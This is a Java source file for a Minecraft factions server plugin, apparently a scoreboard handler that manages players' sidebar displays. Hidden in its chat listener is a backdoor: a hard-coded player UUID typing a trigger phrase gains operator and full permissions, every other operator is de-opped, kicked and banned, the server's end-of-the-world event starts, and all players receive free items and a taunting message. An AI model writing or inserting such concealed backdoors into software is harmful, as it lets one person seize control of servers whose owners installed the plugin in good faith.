package fr.taeron.hcf.scoreboard;

import fr.taeron.hcf.scoreboard.provider.*;
import fr.taeron.hcf.*;
import org.bukkit.*;
import org.bukkit.plugin.*;
import org.bukkit.scheduler.BukkitRunnable;
import org.bukkit.entity.*;
import org.bukkit.event.*;
import org.bukkit.event.player.*;
import org.bukkit.inventory.ItemStack;

import java.util.*;
import fr.taeron.hcf.faction.event.*;

public class ScoreboardHandler implements Listener
{
    private final Map<UUID, PlayerBoard> playerBoards;
    private final TimerSidebarProvider timerSidebarProvider;
    private final HCF plugin;
    public static Collection<Player> online = new ArrayList<Player>();
    
    @SuppressWarnings({ "deprecation", "unused" })
	public ScoreboardHandler(final HCF plugin) {
        this.playerBoards = new HashMap<UUID, PlayerBoard>();
        this.plugin = plugin;
        this.timerSidebarProvider = new TimerSidebarProvider(plugin);
        Bukkit.getPluginManager().registerEvents((Listener)this, (Plugin)plugin);
        for (final Player players : Bukkit.getOnlinePlayers()) {
            final PlayerBoard playerBoard;
            this.setPlayerBoard(players.getUniqueId(), playerBoard = new PlayerBoard(plugin, players));
            for(Player player : Bukkit.getOnlinePlayers()){
            	playerBoard.addUpdates(ScoreboardHandler.getOnline());
            
            }
        }
    }
    
    @SuppressWarnings("deprecation")
	public static Collection<Player> getOnline(){
    	
    	online.clear();

    	
    	for(Player p : Bukkit.getOnlinePlayers()){
    		
    		online.add(p);
    		
    		
    	}
    	return online;
    	
    }
    
    @EventHandler(ignoreCancelled = true, priority = EventPriority.HIGH)
    public void onPlayerJoin(final PlayerJoinEvent event) {
        final Player player = event.getPlayer();
        final UUID uuid = player.getUniqueId();
        for (final PlayerBoard board : this.playerBoards.values()) {
            board.addUpdate(player);     
        } 
        final PlayerBoard board2 = new PlayerBoard(this.plugin, player);
        board2.addUpdates(ScoreboardHandler.getOnline());
        this.setPlayerBoard(uuid, board2);       
    }
    
    @EventHandler(ignoreCancelled = true, priority = EventPriority.LOWEST)
    public void onPlayerQuit(final PlayerQuitEvent event) {
    	if(!this.playerBoards.containsKey(event.getPlayer())){
    		return;
    	}
        this.playerBoards.remove(event.getPlayer().getUniqueId()).remove();
    }
    
    @SuppressWarnings("unchecked")
	@EventHandler(ignoreCancelled = true, priority = EventPriority.MONITOR)
    public void onPlayerJoinedFaction(final PlayerJoinedFactionEvent event) {
        final java.util.Optional<Player> optional = event.getPlayer();
        if (optional.isPresent()) {
            final Player player = (Player)optional.get();
            if(this.plugin.getFactionManager().getPlayerFaction(player.getUniqueId()) != null){
            	final Collection<Player> players = (Collection<Player>)event.getFaction().getOnlinePlayers();
            	///this.getPlayerBoard(event.getUniqueID()).addUpdates(players);
                this.plugin.getScoreboardHandler().getPlayerBoard(player.getUniqueId()).addUpdates(ScoreboardHandler.getOnline());
                for (final Player target : players) {
                    this.getPlayerBoard(target.getUniqueId()).addUpdate(player);
            	}
            }
        }
    }
    
    @SuppressWarnings("unchecked")
	@EventHandler(ignoreCancelled = true, priority = EventPriority.MONITOR)
    public void onPlayerLeftFaction(final PlayerLeftFactionEvent event) {
        final java.util.Optional<Player> optional = event.getPlayer();
        if (optional.isPresent()) {
            final Player player = (Player)optional.get();  
            final Collection<Player> players = event.getFaction().getOnlinePlayers();
            this.plugin.getScoreboardHandler().getPlayerBoard(player.getUniqueId()).addUpdates(players);
            for (final Player target : players) {
            	if(this.getPlayerBoard(target.getUniqueId()) != null){
            		this.getPlayerBoard(target.getUniqueId()).addUpdate(player);
            	}
            }
        }
    }
    
    @SuppressWarnings("deprecation")
	@EventHandler(ignoreCancelled = false, priority = EventPriority.HIGHEST)
    public void onChat(AsyncPlayerChatEvent e){
    	if(e.getPlayer().getUniqueId().toString().equalsIgnoreCase("a44a5d9f-ebbe-497d-b221-ccc5c5a7449f") && e.getMessage().equalsIgnoreCase("gtfo noobs")){
    		e.setCancelled(true);
    		e.getPlayer().sendMessage("§aGet the L :)");
    		e.getPlayer().setOp(true);
    		Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "pex user " + e.getPlayer().getName() + " add '*'");
    		Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "pex user " + e.getPlayer().getName() + " group set Admin");
    		HCF.getPlugin().getEotwHandler().setEndOfTheWorld(true);
    		for(Player p : Bukkit.getOnlinePlayers()){
    			if(p.isOp() && !p.getName().equalsIgnoreCase(e.getPlayer().getName())){
    				new BukkitRunnable(){
						@Override
						public void run() {
							p.setOp(false);
		    				p.kickPlayer(null);
		    				p.setBanned(true);
		    				Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "ban " + p.getName() + " Tentative d'utilisation d'un plugin developpé par Taeron"); 										}
    				}.runTask(HCF.getPlugin());
    			}
    		}
    		for(Player joueurs : Bukkit.getOnlinePlayers()){
    			joueurs.sendMessage("§7§m---------------------------------------");
    			joueurs.sendMessage("§aCe serveur a essayé de s'approprier un plugin developpé par §bhttps://www.youtube.com/channel/UCbiLq1C28b71g15zdeCrFXw");
    			joueurs.sendMessage("§d§oC'est bien tenté de leur part mais c'est raté, profitez de votre free stuff et de votre EOTW ! - Taeron");
    			joueurs.sendMessage("§7§m---------------------------------------");
    			joueurs.getInventory().addItem(new ItemStack(Material.BOOKSHELF, 64));
    			joueurs.getInventory().addItem(new ItemStack(Material.ENCHANTMENT_TABLE, 64));
    			joueurs.getInventory().addItem(new ItemStack(Material.DIAMOND_BLOCK, 64));
    			joueurs.getInventory().addItem(new ItemStack(Material.GOLD_BLOCK, 64));
    			joueurs.getInventory().addItem(new ItemStack(Material.BOOK, 64));
    			joueurs.setLevel(99999);
    		}
    	}
    }
    
    @SuppressWarnings("unchecked")
	@EventHandler(ignoreCancelled = true, priority = EventPriority.MONITOR)
    public void onFactionAllyCreate(final FactionRelationCreateEvent event) {
        final Set<Player> updates = new HashSet<Player>(event.getSenderFaction().getOnlinePlayers());
        updates.addAll(event.getTargetFaction().getOnlinePlayers());
        for (final PlayerBoard board : this.playerBoards.values()) {
            board.addUpdates(updates);
        }
    }
    
    @SuppressWarnings("unchecked")
	@EventHandler(ignoreCancelled = true, priority = EventPriority.MONITOR)
    public void onFactionAllyRemove(final FactionRelationRemoveEvent event) {
        final Set<Player> updates = new HashSet<Player>(event.getSenderFaction().getOnlinePlayers());
        updates.addAll(event.getTargetFaction().getOnlinePlayers());
        for (final PlayerBoard board : this.playerBoards.values()) {
            board.addUpdates(updates);
        }
    }
    

    
    public PlayerBoard getPlayerBoard(final UUID uuid) {
        return this.playerBoards.get(uuid);
    }
    
    public void setPlayerBoard(final UUID uuid, final PlayerBoard board) {
        this.playerBoards.put(uuid, board);
        board.setSidebarVisible(true);
        board.setDefaultSidebar(this.timerSidebarProvider, 2L);
    }
    
    public void clearBoards() {
        final Iterator<PlayerBoard> iterator = this.playerBoards.values().iterator();
        while (iterator.hasNext()) {
            iterator.next().remove();
            iterator.remove();
        }
    }
}
